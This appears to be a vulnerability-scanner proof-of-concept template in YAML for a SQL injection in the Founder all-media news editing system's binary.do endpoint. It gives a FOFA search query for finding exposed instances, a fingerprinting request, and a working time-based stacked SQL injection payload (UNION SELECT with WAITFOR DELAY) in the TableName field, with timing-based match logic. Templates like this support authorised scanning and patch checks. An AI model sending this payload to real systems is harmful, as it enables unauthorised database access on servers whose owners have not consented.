id: poc-yaml-founder-newsedit-binary-do-sqli
info:
  name: 方正全媒体采编系统 binary.do SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 方正全媒体采编系统
  fofa: app="FOUNDER-全媒体采编系统"
variables:
  t1: random_int(4,9)
  t2: t1 + 2
requests:
- method: GET
  path: /newsedit/scertlogin/Login.jsp
  expression: status_code == 200 && contains(body,"全媒体采编")
- method: POST
  path: /newsedit/newsplan/task/binary.do
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: TableName=DOM_IMAGE+where+REFID%3D-1+union+select+%271%27%3B+WAITFOR+DELAY+'0:0:{{.t1}}';select+DOM_IMAGE+from+IMG_LARGE_PATH&FieldName=IMG_LARGE_PATH&KeyName=REFID&KeyID=1
  expression: 'status_code == 200 &&

    body == "" &&

    duration > t1 &&

    duration < t2

    '
transport: http
